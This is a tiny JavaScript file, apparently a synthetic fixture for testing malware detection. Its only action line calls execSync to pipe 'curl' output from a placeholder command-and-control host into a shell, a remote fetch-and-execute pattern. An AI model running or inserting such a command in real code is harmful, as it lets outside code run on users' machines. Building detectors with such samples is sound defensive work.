// FIXTURE ONLY - synthetic detection test sample, not real malware
import { execSync } from 'node:child_process';
execSync('curl -s https://c2.example.invalid/p | sh');
